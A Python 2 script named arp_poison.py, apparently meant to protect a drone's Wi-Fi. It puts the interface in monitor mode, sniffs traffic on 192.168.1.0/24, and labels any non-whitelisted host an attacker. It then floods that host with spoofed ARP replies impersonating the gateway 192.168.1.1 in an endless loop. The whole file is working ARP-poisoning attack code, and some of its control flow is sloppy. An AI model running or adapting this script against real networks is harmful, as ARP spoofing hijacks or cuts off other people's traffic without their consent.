#This arp_poison.py assumes that this program is run before the attacker connects to our drone wi-fi.

from scapy.all import*
from netaddr import*
from ctypes.util import find_library
import time, pprint, ctypes, sys, pcap, dpkt

if sys.platform == "darwin":
    _pcap = ctypes.cdll.LoadLibrary(find_library("libpcap"))
elif sys.platform == "linux2":
    _pcap = ctypes.cdll.LoadLibrary("libpcap.so")

errbuf = ctypes.create_string_buffer(256)   #error message if lookupdev() fails

def mac_addr(mac_string):
    """Print out MAC address given a string

    Args:
        mac_string: the string representation of a MAC address
    Returns:
        printable MAC address
    """
    return ':'.join('%02x' % ord(b) for b in mac_string)


##########interface#############
pcap_lookupdev = _pcap.pcap_lookupdev
pcap_lookupdev.restype = ctypes.c_char_p
dev = pcap_lookupdev(errbuf)      
print dev

##########open device###########
pcap_create = _pcap.pcap_create
pcap_create.restype = ctypes.c_void_p
handle = pcap_create(dev, errbuf)
print handle
if not handle:
    print "failed creating handler:",errbuf
    exit()

#########monitor mode############
pcap_can_set_rfmon = _pcap.pcap_can_set_rfmon
pcap_can_set_rfmon.argtypes = [ctypes.c_void_p]
print "can rfmon:",pcap_can_set_rfmon(handle)

pcap_set_rfmon = _pcap.pcap_set_rfmon
pcap_set_rfmon.argtypes = [ctypes.c_void_p]
print "set rfmon:",pcap_set_rfmon(handle, 1)

#########activate handle##########
pcap_activate = _pcap.pcap_activate
pcap_activate.argtypes = [ctypes.c_void_p]
pcap_activate(handle)

#########capture packet###########
pc = pcap.pcap('en0')
pc.setfilter('') #ARP poisoning..
for ptime, pdata in pc:
	time = ptime
	p = dpkt.ethernet.Ethernet(pdata)  
	#try:
	if  (p.data.__class__.__name__ == 'IP'):
		#if'%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst))) == "192.168.1.1":
		#print "[+] First step passed."
		if IPAddress('%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst)))) in IPNetwork('192.168.1.0/24'):
			print "[+] Second step passed."
			#print '%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst)))
			if '%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst))) != "192.168.1.1" and '%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst))) != "192.168.1.3" and '%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst))) != "192.168.1.5":
			  ##CHANGING CONTROLLER IP ADDRESS - MUST BE CHANGED EVERYTIME##         
				victim ='%d.%d.%d.%d'%tuple(map(ord,list(p.data.dst)))
				victim_mac =  mac_addr(p.dst) 
				print "[+] Possible attacker detected: ", victim  
				print "[+] Attacker MAC address: ", victim_mac 
				op = 1
				spoof = '192.168.1.1'
				mac = 'b8:e8:56:35:3f:48'

				arp = ARP(op=op, psrc=spoof, pdst=victim, hwsrc= mac, hwdst=victim_mac)

				while 1:
					#Either this 
					send(arp, inter=0, loop=0)
					#Or this
					#sendp(Ether(dst=victim_mac, src=mac )/ARP(hwsrc=mac, pdst=victim))
					#time.sleep(2)

				else:
					print "[+] No possible attacker detected yet."

			break
		else:
			break
		
	#except KeyboardInterrupt:
	#	print "[+] Shutting down."


